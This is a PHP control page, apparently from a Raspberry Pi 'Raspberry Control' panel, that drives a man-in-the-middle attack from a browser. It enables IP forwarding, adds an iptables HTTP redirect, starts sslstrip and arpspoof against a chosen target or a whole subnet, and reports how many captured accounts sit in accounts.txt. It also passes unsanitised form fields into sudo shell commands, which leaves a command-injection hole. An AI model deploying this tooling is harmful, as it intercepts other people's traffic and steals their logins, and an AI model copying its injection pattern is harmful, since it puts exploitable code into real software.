<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Strict//EN"
	"http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd">
<!--

	Design by Free CSS Templates
	http://www.freecsstemplates.org
	Released for free under a Creative Commons Attribution License

	Name       : Neutral Charisma
	Version    : 1.0
	Released   : 20130222

-->
<html>
	<head>
		<meta name="keywords" content="" />
		<meta name="description" content="" />
		<meta http-equiv="content-type" content="text/html; charset=utf-8" />
		<title>Raspberry Control - SSLStrip</title>
		<link href="http://fonts.googleapis.com/css?family=PT+Sans+Narrow" rel="stylesheet" type="text/css" />
		<link href="http://fonts.googleapis.com/css?family=Lobster" rel="stylesheet" type="text/css" />
		<link rel="stylesheet" type="text/css" href="style.css" />
	</head>
	<body>
		<div id="bg">
			<div id="outer">
				<div id="header">
					<div id="logo">
						<h1>
							<a>SSlstrip</a>
						</h1>
					</div>
					<div id="nav">
						<ul>
							<li class="first active">
								<a href="index.php">Home</a>
							</li>
							<li>
								<a href="client.php">Wireless Client</a>
							</li>
							<li>
								<a href="ap.php">Access Point</a>
							</li>
							<li>
								<a href="dhcp.php">DHCP Server</a>
							</li>
							<li>
								<a href="sslstrip.php">SSLstrip</a>
							</li>
							<li>
								<a href="dnsspoof.php">Dnsspoof</a>
							</li>
							<li>
								<a href="downloads.php">Downloads</a>
							</li>
							<li class="last">
								<a href="admin.php">Administration</a>
							</li>
						</ul>
						<br class="clear" />
					</div>
				</div>
				<div id="main">
					<div id="sidebar1">
						<h3>
							Status:
						</h3>
						
						<ul class="linkedList">
							<li class="first">
								<a href="client.php">Wireless Client: </a><br />
								<?php
								exec('ifconfig wlan0',$return);
								$strWlan0 = implode(" ",$return);
								$strWlan0 = preg_replace('/\s\s+/', ' ', $strWlan0);
								if(strpos($strWlan0, "UP") !== false && strpos($strWlan0, "RUNNING") !== false) {
									echo "Wireless client connected";
								} else {
									echo "Wireless client not connected";
								}
								?>
							</li>
							<li>
								<a href="ap.php">Access point: </a><br />
								<?php
								exec('pidof hostapd | wc -l',$hostapdstatus);
								if($hostapdstatus[0] == 0) {
									echo "Access point not running";
								} else {
									echo "Access point running";
								}
								?>
							</li>
							<li>
								<a href="dhcp.php">DHCP Server: </a><br />
								<?php
								exec('pidof udhcpd | wc -l',$dnsmasq);
								if($dnsmasq[0] == 0) {
									echo "DHCP Server not running";
								} else {
									echo "DHCP Server running";
								}
								?>
							</li>
							<li>
								<a href="sslstrip.php#arpspoof">Arpspoof: </a><br />
								<?php
								exec('pidof arpspoof | wc -l',$arpspoofok);
								if($arpspoofok[0] == 0) {
									echo "Arpspoof is not running";
								} else {
									echo "Arpspoof is running";
								}
								?>
							</li>
							<li>
								<a href="sslstrip.php#sslstrip">Sslstrip: </a><br />
								<?php 
								exec('pgrep -f sslstrip | wc -l',$sslstripok);
								if($sslstripok[0] == 1) {
									echo "Sslstrip is not running";
								} else {
									echo "Sslstrip is running";
								}
								?>
							</li>
							<li>
								<a href="sslstrip.php#cleaner">Cleaner: </a><br />
								<?php 
								exec('pgrep -f cleaner.py | wc -l',$cleanok);
								if($cleanok[0] == 1) {
									echo "Cleaner is not running";
								} else {
									echo "Cleaner is running";
								}
								?>
							</li>
							<li class="last">
								<a href="dnsspoof.php">Dnsspoof</a><br />
								Dnsspoof not running
							</li>
						</ul>
					</div>
					<div id="sidebar2">
						<h3>
							Info:
						</h3>
						<p>
							Some help info
						</p>
					</div>
					<div id="content">
						<?php
						$output = $return = 0;
						
						exec('pgrep -f sslstrip | wc -l',$sslstripok);
						if($sslstripok[0] == 1) {
							$sslstripstatus = 'Sslstrip not running';
						} else {
							$sslstripstatus = 'Sslstrip is running';
						}
						exec('pidof arpspoof | wc -l',$arpspoofok);
						if($arpspoofok[0] == 0) {
							$arpspoofstatus = 'Arpspoof not running';
						} else {
							$arpspoofstatus = 'Arpspoof is running';
							exec('pgrep -f -l arpspoof',$return);
							$process = explode(" ",$return[0]);
							$ettercapinterface = $process[4];
							if($process[5] == '-t') {
								$ettercaptargetip = $process[6];
							} else {
								$ettercaptargetip = 'all';
							}
						}
						exec('pgrep -f cleaner.py | wc -l',$cleanok);
						if($cleanok[0] == 1) {
							$cleanerstatus = 'Cleaner not running';
						} else {
							$cleanerstatus = 'Cleaner is running';
						}
						
						exec("route -n | grep 'UG[ \t]' | awk '{print $2}'",$routerip);
						
						exec('cat /proc/sys/net/ipv4/ip_forward',$forwardok);
						if($forwardok[0] == 0) {
							$forwardstatus = 'Traffic not forwarded';
						} else {
							$forwardstatus = 'Traffic forwarded';
						}
						
						exec('sudo iptables -L -vt nat | grep "http redir ports 8080" | wc -l',$iptablesok);
						if($iptablesok[0] == 0) {
							$iptablesstatus = 'Iptables not set';
						} else {
							$iptablesstatus = 'Iptables set';
						}
						$output = $return = 0;
						exec('[ -f accounts.txt ] && echo "1" || echo "0"',$return);
						if($return[0] == 0) {
							$accountstatus = 'No accounts.txt file present';
						} else {
							$return = shell_exec('wc -l accounts.txt');
							$accountnr = explode(" ", $return);
							$accountstatus = 'Accounts.txt file present, contains: '.$accountnr[0].' account(s)';
						}
						$output = $return = 0;
						exec('ls -lah sslstrip.log | wc -l',$return);
						if($return[0] == 0) {
							$logstatus = 'No sslstrip.log present';
						} else {
							$return = shell_exec('ls -lah sslstrip.log');
							$bitcount = explode(" ", $return);
							$logstatus = 'Sslstrip.log present, size: '.$bitcount[4].'';
						}
						
						echo '
						<form method="POST">
						<div id="box1">
							<h2>
								IP Forward & IP Tables
							</h2>
							<p>
								Traffic forward status : '.$forwardstatus.'<br />
								Iptables status : '.$iptablesstatus.'<br />
								<input type="submit" value="Set up" name="setupforward" />
								<input type="submit" value="Clean everything up" name="cleanforward" /><br />
							</p>
						</div>
						<div id="box1">
							<h2><a name="sslstrip"></a>
								SSLstrip
							</h2>
							<p>
								Status : '.$sslstripstatus.'<br />
								<input type="submit" value="Start sslstrip" name="startsslstrip" />
								<input type="submit" value="Stop sslstrip" name="stopsslstrip" /><br />
							</p>
						</div>
						<div id="box1"><a name="arpspoof"></a>
							<h2>
								ArpSpoof
							</h2>
							<p>
								Status : '.$arpspoofstatus.'<br />
								Interface : <select name="interface">';
								exec("cat /proc/net/dev | tail -n -4 | awk -F :\  ' { print $1 } ' | tr -d ' '",$interfaces);
		
								foreach($interfaces as $int) {
									$select = '';
									if($int == $ettercapinterface) {
									$select = " selected";
									}
									echo '<option value="'.$int.'"'.$select.'>'.$int.'</option>';
								}
								echo '<option value="wlan0"'.$select.'>wlan0</option>';
								echo '</select><input type="submit" value="Discover hosts" name="netdiscover" />
								</select><input type="submit" value="Clean host list" name="cleanhosts" /><br />
								<textarea name="review" cols=77 rows=10>';
		
								$hosts = @fopen(hosts, 'r');
								if ($hosts) {
									echo fread($hosts, filesize(hosts));
								}
		
								echo '</textarea><br />
								Router IP : <input type="text" name="routerip" value="'.$routerip[0].'" /> <br />
								Target IP : <input type="text" name="targetip" value="'.$ettercaptargetip.'" /> For all leave empty <br />
								<input type="submit" value="Start arpspoof" name="startarpspoof" />
								<input type="submit" value="Stop arpspoof" name="stoparpspoof" /><br />
							</p>
						</div>
						<div id="box1"><a name="cleaner"></a>
							<h2>
								log cleaner
							</h2>
							<p>
								Status : '.$cleanerstatus.'<br />
								'.$accountstatus.'<br />
								'.$logstatus.'<br />
								Cleaner interval (in seconds) : <input type="text" name="cleanerinterval" value="60" /> <br />
								<input type="submit" value="Start Cleaner" name="startcleaner" />
								<input type="submit" value="Stop Cleaner" name="stopcleaner" />
								<input type="submit" value="Run Cleaner Once" name="cleaner" /><br />
								

								
							</p>
						</div>
						<br class="clear" />';
						if(isset($_POST['setupforward'])) {
							exec('sudo bash -c "echo 1 > /proc/sys/net/ipv4/ip_forward"');
							exec('sudo bash -c "iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 8080"');
							echo "IPForward and IPTables setup";
						}
						if(isset($_POST['cleanforward'])) {
							exec('sudo bash -c "echo 0 > /proc/sys/net/ipv4/ip_forward"');
							exec('sudo bash -c "iptables -t nat -F && iptables -t nat -X"');
							echo "Everything Cleaned Up";
						}
						if(isset($_POST['startsslstrip'])) {
							exec('sudo sslstrip -l 8080 -a -w sslstrip.log 2>/dev/null &');
							echo "Starting SSLStrip";
						}
						if(isset($_POST['stopsslstrip'])) {
							exec('pidof /usr/bin/python /usr/bin/sslstrip',$return);
							$command1 = 'sudo kill %d';
							exec(sprintf($command1, $return[0]));
							echo "Stopping SSLStrip";
						}
						if(isset($_POST['startarpspoof'])) {
							if($_POST['targetip'] == 0) {
								$command1 = 'sudo arpspoof -i %1$s %2$s 2>/dev/null &';
								exec(sprintf($command1, $_POST['interface'], $_POST['routerip']));
								echo "Starting arpspoof";
							} else {
								$command1 = 'sudo arpspoof -i %1$s -t %2$s %3$s 2>/dev/null &';
								$command2 = sprintf($command1, $_POST['interface'], $_POST['targetip'], $_POST['routerip']);
								exec($command2);
								echo "Starting arpspoof";
							}
						}
						if(isset($_POST['stoparpspoof'])) {
							exec('pidof arpspoof',$return);
							$command1 = 'sudo kill %d';
							exec(sprintf($command1, $return[0]));
							echo "Stopping arpspoof";
						}
						
						if(isset($_POST['startcleaner'])) {
							$command1 = 'sudo python cleaner.py %d 2>/dev/null &';
							exec(sprintf($command1, $_POST['cleanerinterval']));
							echo "Cleaner Started";
						}
						if(isset($_POST['stopcleaner'])) {
							exec('pgrep -f cleaner.py',$return);
							$command1 = 'sudo kill %d';
							exec(sprintf($command1, $return[0]));
							echo "Cleaner Stopped";
						}
						if(isset($_POST['cleaner'])) {
							exec('sudo python parselog.py');
							echo "sslstrip.log cleaned";
						}
						if(isset($_POST['netdiscover'])) {
							exec('sudo bash -c "netdiscover -i '.$_POST['interface'].' -r '.$routerip[0].'/24 -P > hosts"');
							echo "Discovered hosts, reload page";
						}
						if(isset($_POST['cleanhosts'])) {
							exec('sudo bash -c "rm hosts"');
							echo "Done, reload page";
						}
						?>
					</div>
					<br class="clear" />
				</div>
			</div>
			<div id="copyright">
				&copy; Your Site Name | Design by <a href="http://www.freecsstemplates.org/">FCT</a>
			</div>
		</div>
	</body>
</html>
